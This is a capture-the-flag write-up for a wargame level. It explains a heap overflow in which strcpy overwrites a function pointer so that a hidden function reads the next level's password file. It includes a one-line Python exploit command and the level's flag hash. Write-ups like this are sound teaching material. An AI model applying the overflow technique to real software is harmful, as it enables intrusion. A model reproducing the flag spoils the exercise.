# Level 6

**Vulnerability:** Heap overflow overwriting a function pointer (`strcpy` from `argv[1]`).

## Walkthrough

`main` allocates two heap chunks:

- `malloc(0x40)` — 64-byte string buffer
- `malloc(4)` — a function pointer, initialized to `m()` (prints "Nope")

It then does `strcpy(buf, argv[1])` with no bounds check and finally calls the
function pointer. An unused `n()` at `0x08048454` runs
`system("/bin/cat .../level7/.pass")`.

We overflow the first chunk into the second and replace the pointer with `n`'s
address. Each malloc chunk carries an 8-byte header, so to reach the pointer:
`64 (buf) + 8 (header) = 72` bytes of padding, then the address of `n`.

## Exploit

```sh
./level6 $(python -c "print 'A'*72 + '\x54\x84\x04\x08'")
```

**Flag:** `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
